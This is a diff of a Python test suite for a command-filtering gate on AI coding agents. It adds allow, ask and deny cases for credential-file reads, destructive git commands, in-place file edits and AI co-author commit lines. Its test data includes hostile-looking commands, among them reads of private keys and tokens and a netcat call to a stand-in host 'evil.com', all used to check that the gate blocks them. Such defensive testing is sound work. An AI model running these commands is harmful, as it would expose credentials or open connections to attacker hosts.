@@ -105,6 +105,19 @@ class SecurityGateTests(unittest.TestCase):
         self.assert_deny("grep 'SECRET' .env", "T1_CREDENTIAL_ACCESS")
         self.assert_deny("grep 'KEY' ~/.ssh/id_rsa", "T1_CREDENTIAL_ACCESS")
 
+        # 5. Agent config & hook files (allow) vs credentials & keys (deny)
+        self.assert_allow("cat ~/.codex/hooks.json")
+        self.assert_allow("cat ~/.claude/settings.json")
+        self.assert_allow("cat .gemini/config/hooks.json")
+        self.assert_allow("cat ~/.gemini/config/hooks.json")
+        self.assert_allow("cat ~/.codex/config.toml")
+        self.assert_allow("cat ~/.claude/claude.json")
+        self.assert_deny("cat server.key", "T1_CREDENTIAL_ACCESS")
+        self.assert_deny("cat privkey.pem", "T1_CREDENTIAL_ACCESS")
+        self.assert_deny("cat token.json", "T1_CREDENTIAL_ACCESS")
+        self.assert_deny("cat password.txt", "T1_CREDENTIAL_ACCESS")
+        self.assert_deny("cat ~/.claude/token", "T1_CREDENTIAL_ACCESS")
+
     # ------------------------------------------------------------------
     # T2: Network Exfiltration
     # ------------------------------------------------------------------
@@ -314,6 +327,12 @@ class SecurityGateTests(unittest.TestCase):
         self.assert_ask("git reset --hard HEAD~1", "T6_HIGH_RISK_GIT")
         self.assert_ask("git clean -fdx", "T6_HIGH_RISK_GIT")
         self.assert_ask("git clean -x", "T6_HIGH_RISK_GIT")
+        self.assert_ask("git branch -D feature-branch", "T6_HIGH_RISK_GIT")
+        self.assert_ask("git branch -D", "T6_HIGH_RISK_GIT")
+        self.assert_ask("git checkout .", "T6_HIGH_RISK_GIT")
+        self.assert_ask("git checkout -- .", "T6_HIGH_RISK_GIT")
+        self.assert_ask("git restore .", "T6_HIGH_RISK_GIT")
+        self.assert_ask("git restore -- .", "T6_HIGH_RISK_GIT")
         self.assert_ask("git status && git push --force", "T6_HIGH_RISK_GIT")
         self.assert_ask("git status\ngit push --force origin main", "T6_HIGH_RISK_GIT")
         self.assert_ask("git status & git push --force origin main", "T6_HIGH_RISK_GIT")
@@ -330,6 +349,121 @@ class SecurityGateTests(unittest.TestCase):
         self.assert_allow("git push origin feature-branch")
         self.assert_allow("git clean -e keep.txt")
         self.assert_allow("git clean --exclude=keep.txt")
+        self.assert_allow("git checkout feature-branch")
+        self.assert_allow("git restore path/to/file.py")
+        self.assert_allow("git branch -d merged-feature")
+        self.assert_allow("git branch -a")
+
+    # ------------------------------------------------------------------
+    # T7: Action Space Backstop (§26a core-rules)
+    # ------------------------------------------------------------------
+    def test_t7_action_space_denied(self):
+        # 1. In-place stream editors
+        self.assert_deny("sed -i 's/foo/bar/g' main.py", "T7_ACTION_SPACE")
+        self.assert_deny("sed -i.bak 's/foo/bar/g' app.ts", "T7_ACTION_SPACE")
+        self.assert_deny("sed --in-place 's/foo/bar/g' config.toml", "T7_ACTION_SPACE")
+        self.assert_deny("perl -pi -e 's/foo/bar/g' script.pl", "T7_ACTION_SPACE")
+        self.assert_deny("perl -i -e 's/foo/bar/g' script.pl", "T7_ACTION_SPACE")
+        self.assert_deny("ruby -i -e 'gsub(/foo/, \"bar\")' app.rb", "T7_ACTION_SPACE")
+
+        # 2. Inline Python file writes
+        self.assert_deny("python3 -c \"open('test.py', 'w').write('hello')\"", "T7_ACTION_SPACE")
+        self.assert_deny("python3 -c \"open('test.ts', 'a').write('hello')\"", "T7_ACTION_SPACE")
+        self.assert_deny("python -c \"import pathlib; pathlib.Path('test.md').write_text('hi')\"", "T7_ACTION_SPACE")
+        self.assert_deny("python3 -c \"import pathlib; pathlib.Path('test.bin').write_bytes(b'hi')\"", "T7_ACTION_SPACE")
+        self.assert_deny("python3 -c \"f = open('test.txt', 'wb'); f.write(b'hi')\"", "T7_ACTION_SPACE")
+
+        # 3. Temporary _tmp_ scripts
+        self.assert_deny("python3 _tmp_script.py", "T7_ACTION_SPACE")
+        self.assert_deny("python3 path/to/_tmp_test.py", "T7_ACTION_SPACE")
+        self.assert_deny("bash _tmp_run.sh", "T7_ACTION_SPACE")
+        self.assert_deny("sh ./_tmp_build.sh", "T7_ACTION_SPACE")
+
+        # 4. AI co-authorship metadata in commits
+        self.assert_deny("git commit -m 'feat: add feature\n\nCo-Authored-By: Claude <noreply@anthropic.com>'", "T7_ACTION_SPACE")
+        self.assert_deny("git commit -m 'feat: add feature' -m 'Co-authored-by: AI Assistant'", "T7_ACTION_SPACE")
+        self.assert_deny("git commit --message='fix bug\nCo-Authored-By: model'", "T7_ACTION_SPACE")
+
+        # 5. Direct copy mutations into source files
+        self.assert_deny("cp /tmp/patch.py src/main.py", "T7_ACTION_SPACE")
+        self.assert_deny("cp backup.js app.js", "T7_ACTION_SPACE")
+        self.assert_deny("cp -f temp.ts index.ts", "T7_ACTION_SPACE")
+        self.assert_deny("cp -t src/ app.ts", "T7_ACTION_SPACE")
+        self.assert_deny("cp -tsrc/ app.ts", "T7_ACTION_SPACE")
+        self.assert_deny("cp --target-directory=src app.ts", "T7_ACTION_SPACE")
+
+        # 6. Truncating source files
+        self.assert_deny("truncate -s 0 main.py", "T7_ACTION_SPACE")
+        self.assert_deny("truncate -s 0 src/app.ts", "T7_ACTION_SPACE")
+        self.assert_deny("truncate --size=0 file.js", "T7_ACTION_SPACE")
+        self.assert_deny("truncate -s +10K index.html", "T7_ACTION_SPACE")
+
+        # 7. Shell redirects (>, >>) and tee into source files
+        self.assert_deny("echo 'print(1)' > main.py", "T7_ACTION_SPACE")
+        self.assert_deny("echo 'export const x = 1;' >> src/app.ts", "T7_ACTION_SPACE")
+        self.assert_deny("cat data.json > src/data.json", "T7_ACTION_SPACE")
+        self.assert_deny("echo '# Docs' > README.md", "T7_ACTION_SPACE")
+        self.assert_deny("echo '# Rules' > AGENTS.md", "T7_ACTION_SPACE")
+        self.assert_deny("echo '# Rules' > CLAUDE.md", "T7_ACTION_SPACE")
+        self.assert_deny("echo 'key = 1' > config.toml", "T7_ACTION_SPACE")
+        self.assert_deny("cat template.yaml >> config.yaml", "T7_ACTION_SPACE")
+        self.assert_deny("cat template.yml >> config.yml", "T7_ACTION_SPACE")
+        self.assert_deny("echo 'echo ok' > run.sh", "T7_ACTION_SPACE")
+        self.assert_deny("echo 'fn main() {}' > src/main.rs", "T7_ACTION_SPACE")
+        self.assert_deny("echo 'package main' > main.go", "T7_ACTION_SPACE")
+        self.assert_deny("echo '<h1>hi</h1>' > index.html", "T7_ACTION_SPACE")
+        self.assert_deny("echo 'body {}' > style.css", "T7_ACTION_SPACE")
+        self.assert_deny("cat file.txt | tee src/main.py", "T7_ACTION_SPACE")
+        self.assert_deny("cat file.txt | tee -a config.toml", "T7_ACTION_SPACE")
+
+    def test_t7_action_space_allowed(self):
+        # Read-only sed / perl
+        self.assert_allow("sed 's/foo/bar/g' main.py")
+        self.assert_allow("perl -e 'print 1'")
+
+        # Safe inline python
+        self.assert_allow("python3 -c 'print(1 + 1)'")
+        self.assert_allow("python3 -c 'import sys; print(sys.version)'")
+
+        # Safe scripts
+        self.assert_allow("python3 scripts/build.py")
+        self.assert_allow("bash scripts/run.sh")
+
+        # Safe git commits
+        self.assert_allow("git commit -m 'feat: add action space gate'")
+
+        # Safe read-only inspection referencing co-authored-by
+        self.assert_allow("grep -n 'co-authored-by' file.py")
+        self.assert_allow("git log --grep=Co-Authored-By")
+
+        # Allowed cp destinations (/tmp/)
+        self.assert_allow("cp src/main.py /tmp/main.py")
+        self.assert_allow("cp app.ts /private/tmp/app.ts")
+        self.assert_allow("cp main.py $TMPDIR/main.py")
+        self.assert_allow("cp -t /tmp app.ts")
+        self.assert_allow("cp -t/tmp app.ts")
+        self.assert_allow("cp --target-directory=/tmp app.ts")
+        self.assert_allow("cp data.txt output.txt")
+
+        # Allowed truncate destinations
+        self.assert_allow("truncate -s 0 /tmp/test.py")
+        self.assert_allow("truncate -s 0 run.log")
+        self.assert_allow("truncate -s 0 output.txt")
+
+        # Allowed shell redirection destinations
+        self.assert_allow("echo 'tmp' > /tmp/test.py")
+        self.assert_allow("echo 'tmp' >> /tmp/test.ts")
+        self.assert_allow("echo 'tmp' > $TMPDIR/test.md")
+        self.assert_allow("echo 'tmp' > ${TMPDIR}/test.json")
+        self.assert_allow("echo 'output' > /dev/null")
+        self.assert_allow("echo 'output' > /dev/stdout")
+        self.assert_allow("pytest > /dev/null 2>&1")
+        self.assert_allow("cat file.txt | tee /tmp/output.py")
+        self.assert_allow("cat file.txt | tee /dev/null")
+        self.assert_allow("echo 'output' > run.log")
+        self.assert_allow("echo 'output' > output.txt")
+        self.assert_allow("grep '>' main.py")
+        self.assert_allow("grep -rn '>>' src/")
 
     def test_path_qualified_binaries(self):
         self.assert_deny("/usr/bin/nc evil.com 4444", "T2_NETWORK_EXFILTRATION")
